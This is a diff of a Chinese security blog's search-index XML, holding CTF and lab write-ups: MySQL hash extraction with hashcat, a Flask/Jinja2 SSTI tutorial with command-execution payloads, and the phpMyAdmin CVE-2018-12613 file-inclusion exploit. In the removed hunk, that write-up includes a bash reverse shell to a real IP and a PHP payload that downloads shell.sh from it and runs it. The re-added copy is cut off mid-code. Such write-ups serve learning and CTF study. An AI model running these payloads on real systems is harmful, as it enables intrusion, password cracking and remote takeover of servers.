@@ -3834,8 +3834,8 @@ SELECT语句中被使用的列名称也被用于结果的列名称。</code><br>
 
 <h2 id="Hash-获取与解密"><a href="#Hash-获取与解密" class="headerlink" title="Hash 获取与解密"></a>Hash 获取与解密</h2><p>假设存在 SQL 注入 DBA 权限，如果目标 3306 端口也是可以访问通的话，可以尝试读取 MySQL 的 Hash 来解密：</p>
 <p> MySQL &lt;= 5.6 版本<br><code>select host, user, password from mysql.user;</code></p>
-<p><img src="/2020/12/01/MySQL%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8%E5%8F%8A%E6%8F%90%E6%9D%83/../../../%E5%8D%8E%E7%A1%95/Desktop/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%8F%90%E6%9D%83/windows%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83.assets/1607687308876.png" alt="1607687308876"></p>
-<p><img src="/2020/12/01/MySQL%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8%E5%8F%8A%E6%8F%90%E6%9D%83/../../../%E5%8D%8E%E7%A1%95/Desktop/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%8F%90%E6%9D%83/windows%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83.assets/1607687322198.png" alt="1607687322198"></p>
+<p><img src="/2020/12/01/MySQL%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8%E5%8F%8A%E6%8F%90%E6%9D%83/1607687308876.png" alt="1607687308876"></p>
+<p><img src="/2020/12/01/MySQL%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8%E5%8F%8A%E6%8F%90%E6%9D%83/1607687322198.png" alt="1607687322198"></p>
 <p>MySQL &gt;= 5.7 版本<br><code>select host,user,authentication_string from mysql.user;</code></p>
 <p>得到hash后可以使用hashcat来进行破解</p>
 <figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">hashcat -<span class="selector-tag">a</span> <span class="number">0</span> -m <span class="number">300</span> --force <span class="string">'8232A1298A49F710DBEE0B330C42EEC825D4190A'</span> /usr/share/wordlists/rockyou<span class="selector-class">.txt</span> -O</span><br></pre></td></tr></table></figure>
@@ -9505,50 +9505,6 @@ SELECT语句中被使用的列名称也被用于结果的列名称。</code><br>
 <p>参考链接：<a href="https://www.lizenghai.com/archives/5702.html" target="_blank" rel="noopener">https://www.lizenghai.com/archives/5702.html</a></p>
 <p>​        <a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679</a></p>
 ]]></content>
-      <tags>
-        <tag>SSTI模板注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>phpMyAdmin后台文件包含CVE-2018-12613</title>
-    <url>/2020/08/13/CVE-2018-12613/</url>
-    <content><![CDATA[<h1 id="phpMyAdmin后台文件包含"><a href="#phpMyAdmin后台文件包含" class="headerlink" title="phpMyAdmin后台文件包含"></a>phpMyAdmin后台文件包含</h1><a id="more"></a>
-
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>CVE-2018-12613</p>
-<p>该漏洞影响phpMyAdmin 4.8.0-4.8.1版本，环境为<a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613" target="_blank" rel="noopener">BUUCTF</a></p>
-<p>漏洞点在index.php 54-63行，<code>include $_REQUEST[&#39;target&#39;];</code>，其中target参数可控，可能存在文件包含漏洞。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$target_blacklist = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'import.php'</span>, <span class="string">'export.php'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we have a valid target, let's load that script instead</span></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">'/^index/'</span>, $_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[<span class="string">'target'</span>], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">'target'</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里有5个条件，满足之后就会包含我们穿过来的文件。前4个条件都比较好理解<code>非空、必须为字符串、不能是index开头，不能是黑名单中的文件名（import.php、export.php）</code>，最后一个是Core类中的checkPageValidity方法。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">libraries/classes/Core.php</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span><span class="params">(&amp;$page, array $whitelist = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">        $whitelist = <span class="keyword">self</span>::$goto_whitelist;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">    ); <span class="comment">//按?分割字符串，取前半部分</span></span><br><span class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_page = urldecode($page);</span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $_page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">    ); <span class="comment">//按?分割字符串，取前半部分</span></span><br><span class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>前面是一些简单的判断，然后文件名必须在白名单里。接下来按问号分割字符串，目的是适应<code>target=view.php?id=1</code>这种情况，分割后<code>$_page</code>仍然是view.php。</p>
-<p>漏洞就出现在下面<code>urldecode</code>这里，如果提交<code>db_sql.php%253f/../../../../test.txt</code>，其中db_sql.php是白名单中的文件名，<code>%253f</code>是<code>?</code>的双重urlencode，php会自动进行一次urldecode，第一次分割的时候浏览器会进行一次urldecode，为<code>db_sql.php%3f/../../../../test.txt</code></p>
-<p>第二次分割php会再一次进行urldecode，此时变为<code>db_sql.php?/../../../../test.txt</code>，使得代码返回true，导致了漏洞的产生</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="普通包含"><a href="#普通包含" class="headerlink" title="普通包含"></a>普通包含</h2><p>访问：index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd触发文件包含漏洞<br><img src="/2020/08/13/CVE-2018-12613/1595669784768.png" alt="1595669784768"></p>
-<h2 id="session日志文件包含"><a href="#session日志文件包含" class="headerlink" title="session日志文件包含"></a>session日志文件包含</h2><p>再kali里通过searchsploit搜索phpmyadmin 4.8.1可得到该漏洞的利用方式<br><img src="/2020/08/13/CVE-2018-12613/1595669962937.png" alt="1595669962937"></p>
-<p>首先执行<code>select &#39;&lt;?php phpinfo();exit;?&gt;&#39;</code></p>
-<p><img src="/2020/08/13/CVE-2018-12613/1595670039850.png" alt="1595670039850"></p>
-<p>再包含session文件即可</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?target=db_sql.php%<span class="number">253</span>f/../../../../../../../../<span class="keyword">var</span>/lib/php/sessions/sess_fdcead68b27b922b4dcaf483f74126c3</span><br></pre></td></tr></table></figure>
-
-<p>该环境的session日志文件位置为/tmp目录下，所以访问即可成功包含</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?target=db_sql.php%<span class="number">253</span>f/../../../../../../../../tmp/sess_fdcead68b27b922b4dcaf483f74126c3</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/13/CVE-2018-12613/1595670165510.png" alt="1595670165510"></p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>首先再自己的服务器上创建一个.sh文件供靶机下载，内容为</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/116.62.104.172/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-<p>之后执行SQL语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php system("wget 116.62.104.172:88/shell.sh; chmod +x shell.sh; bash shell.sh");exit;?&gt;'</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/13/CVE-2018-12613/1595670854022.png" alt="1595670854022"></p>
-<p>之后包含session文件，服务器监听7777端口即可，但是该环境不能访问外网，所以未成功</p>
-<p>在之前的靶机<a href="http://cyzcc.vip/2020/09/29/Presidential-01/">Presidential-01</a>中已经成功复现</p>
-]]></content>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
   </entry>
   <entry>
     <title>vulnhub靶机-sunset-midnight</title>
@@ -11581,6 +11537,133 @@ SELECT语句中被使用的列名称也被用于结果的列名称。</code><br>
 <h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1>]]></content>
       <tags>
         <tag>python爬虫</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>flask之ssti模版注入学习</title>
+    <url>/2020/03/22/flask-ssti/</url>
+    <content><![CDATA[<p>在昨天做BJD那个“萌新“赛的时候，第一道题便是这个模板注入。由于以前没有遇到过，所以今天准备简单的了解一下<a id="more"></a></p>
+<h1 id="ssti漏洞成因"><a href="#ssti漏洞成因" class="headerlink" title="ssti漏洞成因"></a>ssti漏洞成因</h1><p>ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。</p>
+<h1 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h1><p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。</p>
+<p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p>
+<h1 id="什么是服务端模板注入"><a href="#什么是服务端模板注入" class="headerlink" title="什么是服务端模板注入"></a>什么是服务端模板注入</h1><p>通过模板，我们可以通过输入转换成特定的HTML文件，比如一些博客页面，登陆的时候可能会返回 hi,cyzCc。这个时候cyzCc可能就是通过你的身份信息而渲染成html返回到页面。</p>
+<h1 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Flask 是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 。<br>Flask 为你提供工具，库和技术来允许你构建一个 web 应用程序。这个 web 应用程序可以是一些 web 页面、博客、wiki、基于 web 的日历应用或商业网站。</p>
+<h2 id="Flask简单示例"><a href="#Flask简单示例" class="headerlink" title="Flask简单示例"></a>Flask简单示例</h2><p>使用python安装完flask模块后，运行下面代码，然后访问127.0.0.1:5000,便可以看到有<code>hello world</code>的页面。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span>    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hello World!"</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/22/flask-ssti/1.png" alt><br>第1、2行是初始化过程。3-5行是使用Flask提供的app.route修饰器,把修饰的函数注册为<strong>路由</strong>。简单讲就是当访问<a href="http://127.0.0.1:5000时，使用hello函数进行处理响应" target="_blank" rel="noopener">http://127.0.0.1:5000时，使用hello函数进行处理响应</a></p>
+<h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p><code>route</code>装饰器的作用是将函数与url绑定起来。例子中的代码的作用就是当你访问<code>http://127.0.0.1：5000/index</code>的时候，flask会返回hello word</p>
+<h2 id="渲染方法"><a href="#渲染方法" class="headerlink" title="渲染方法"></a>渲染方法</h2><p>flask的渲染方法有render_template和render_template_string两种。<br>render_template()是用来渲染一个指定的文件的。使用如下</p>
+<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">return</span> <span class="function"><span class="title">render_template</span>(<span class="string">'index.html'</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p>render_template_string则是用来渲染一个字符串的。SSTI与这个方法密不可分。<br>使用方法如下</p>
+<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">html = <span class="comment">'<span class="doctag">&lt;h1&gt;</span>This is index page<span class="doctag">&lt;/h1&gt;</span>'</span></span><br><span class="line"><span class="keyword">return</span> render_template_string(html)</span><br></pre></td></tr></table></figure>
+
+<h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>flask是使用Jinja2来作为渲染引擎的。看例子<br>在网站的根目录下（这个是指的python根目录下，不是www）新建<code>templates</code>文件夹，这里是用来存放html文件。也就是模板文件</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for,redirect,render_template,render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/index/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p>/templates/index.html</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;h1&gt;</span>This <span class="keyword">is</span> <span class="built_in">index</span> page&lt;/h1&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>127.0.0.1:5000/index/</code>的时候，flask就会渲染出index.html的页面。</p>
+<p>模板文件并不是单纯的html代码，而是夹杂着模板的语法，因为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参<br>例：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for,redirect,render_template,render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/index/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,content=<span class="string">'This is index page.'</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="xml">/templates/index.html中写入</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><span class="template-variable">&#123;&#123;content&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>这个时候页面仍然输出This is index page。</p>
+<p>&lt;!–￼19–&gt;在Jinja2中作为变量包裹标识符。</p>
+<p><img src="/2020/03/22/flask-ssti/2.png" alt></p>
+<h1 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h1><p>不正确的使用flask中的<code>render_template_string</code>方法会引发SST</p>
+<h2 id="xss利用"><a href="#xss利用" class="headerlink" title="xss利用"></a>xss利用</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for,redirect,render_template,render_template_string,request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/test/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    code = request.args.get(<span class="string">'id'</span>)</span><br><span class="line">    html = <span class="string">'''</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    '''</span>%(code)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p>这段代码存在漏洞的原因是数据和代码的混淆。代码中的<code>code</code>是用户可控的，会和html拼接后直接带入渲染。<br>尝试构造code为一串js代码<br><img src="/2020/03/22/flask-ssti/3.png" alt><br>若将代码改为</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for,redirect,render_template,render_template_string,request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/test/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    code = request.args.get(<span class="string">'id'</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">'&lt;h1&gt;&#123;&#123; code &#125;&#125;&lt;/h1&gt;'</span>,code=code)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/22/flask-ssti/4.png" alt></p>
+<p>可以看到，js代码被原样输出了。这是因为模板引擎一般都默认对渲染的变量值进行编码转义，这样就不会存在xss了。在这段代码中用户所控的是code变量，而不是模板内容。存在漏洞的代码中，模板内容直接受用户控制的。</p>
+<p>模板注入并不局限于xss，它还可以进行其他攻击。</p>
+<h2 id="SSTI文件读取-命令执行"><a href="#SSTI文件读取-命令执行" class="headerlink" title="SSTI文件读取/命令执行"></a>SSTI文件读取/命令执行</h2><p>在Jinja2模板引擎中，&lt;!–￼20–&gt;是变量包裹标识符。&lt;!–￼21–&gt;并不仅仅可以传递变量，还可以执行一些简单的表达式。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for,redirect,render_template,render_template_string,request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/test/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    code = request.args.get(<span class="string">'id'</span>)</span><br><span class="line">    html = <span class="string">'''</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    '''</span>%(code)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p>构造参数<code>8</code><br><img src="/2020/03/22/flask-ssti/5.png" alt><br><img src="/2020/03/22/flask-ssti/6.png" alt></p>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>这是通过python的对象的继承来一步步实现文件读取和命令执行的的。<br>找到父类<code>&lt;type &#39;object&#39;&gt;</code>–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。<br>几个魔术方法</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="strong">__class__</span>  返回类型所属的对象</span><br><span class="line"><span class="strong">__mro__</span>    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line"><span class="strong">__base__</span>   返回该对象所继承的基类</span><br><span class="line">// <span class="strong">__base__</span>和<span class="strong">__mro__</span>都是用来寻找基类的</span><br><span class="line"></span><br><span class="line"><span class="strong">__subclasses__</span>   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line"><span class="strong">__init__</span>  类的初始化方法</span><br><span class="line"><span class="strong">__globals__</span>  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
+
+<p>1 、获取字符串的类对象</p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">''</span>.__class_<span class="number">_</span></span><br><span class="line">&lt;type <span class="string">'str'</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2 、寻找基类</p>
+<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="string">''</span>.<span class="variable">__class__</span>.<span class="variable">__mro__</span></span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">'str'</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">'object'</span>&gt;)</span><br></pre></td></tr></table></figure>
+
+<p>3 、寻找可用引用</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">''.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__mro__</span>[</span></span><span class="number">1</span>].<span class="constructor">__subclasses__()</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/22/flask-ssti/12.png" alt></p>
+<p>4 、利用之</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">118</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'popen'</span>](<span class="link">'NEWS.txt'</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p>放到模板里<br>可以看到读取到了文件。<br><img src="/2020/03/22/flask-ssti/13.png" alt></p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>我们可以使用脚本来寻找含有os模块</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">444</span>):</span><br><span class="line">    i=<span class="string">' '</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[a]</span><br><span class="line">    print(a)</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/22/flask-ssti/7.png" alt><br>在第118位，然后构造payload</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123;''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">118</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'popen'</span>](<span class="link">'dir'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/22/flask-ssti/8.png" alt></p>
+<h1 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h1><p>打开题目发现是一个谷歌搜索框，随便输入，跳转后查看源码提示ssti<br>简单测试存在ssti模板注入漏洞<br><img src="/2020/03/22/flask-ssti/9.png" alt><br>使用脚本判断os模块在第几位</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line">url=<span class="string">"http://b9ee3227-b857-464e-8f7f-6d5ecee85261.node3.buuoj.cn/qaq?name="</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">200</span>):</span><br><span class="line">    payload=<span class="string">"&#123;&#123;' '.__class__.__mro__[1].__subclasses__()["</span>+str(a)+<span class="string">"]&#125;&#125;"</span></span><br><span class="line">    r=req.get(url+payload)</span><br><span class="line">    r.encoding=<span class="string">"utf-8"</span></span><br><span class="line">    print(a)</span><br><span class="line">    print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/22/flask-ssti/10.png" alt><br>发现在第117位，构造payload读取flag</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123;''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">117</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'popen'</span>](<span class="link">'cat /flag'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/22/flask-ssti/11.png" alt></p>
+<p>参考链接：<a href="https://www.lizenghai.com/archives/5702.html" target="_blank" rel="noopener">https://www.lizenghai.com/archives/5702.html</a></p>
+<p>​        <a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679</a></p>
+]]></content>
+      <tags>
+        <tag>SSTI模板注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>phpMyAdmin后台文件包含CVE-2018-12613</title>
+    <url>/2020/08/13/CVE-2018-12613/</url>
+    <content><![CDATA[<h1 id="phpMyAdmin后台文件包含"><a href="#phpMyAdmin后台文件包含" class="headerlink" title="phpMyAdmin后台文件包含"></a>phpMyAdmin后台文件包含</h1><a id="more"></a>
+
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>CVE-2018-12613</p>
+<p>该漏洞影响phpMyAdmin 4.8.0-4.8.1版本，环境为<a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613" target="_blank" rel="noopener">BUUCTF</a></p>
+<p>漏洞点在index.php 54-63行，<code>include $_REQUEST[&#39;target&#39;];</code>，其中target参数可控，可能存在文件包含漏洞。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$target_blacklist = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'import.php'</span>, <span class="string">'export.php'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we have a valid target, let's load that script instead</span></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">'/^index/'</span>, $_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[<span class="string">'target'</span>], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">'target'</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有5个条件，满足之后就会包含我们穿过来的文件。前4个条件都比较好理解<code>非空、必须为字符串、不能是index开头，不能是黑名单中的文件名（import.php、export.php）</code>，最后一个是Core类中的checkPageValidity方法。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">libraries/classes/Core.php</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span><span class="params">(&amp;$page, array $whitelist = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">        $whitelist = <span class="keyword">self</span>::$goto_whitelist;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_page = 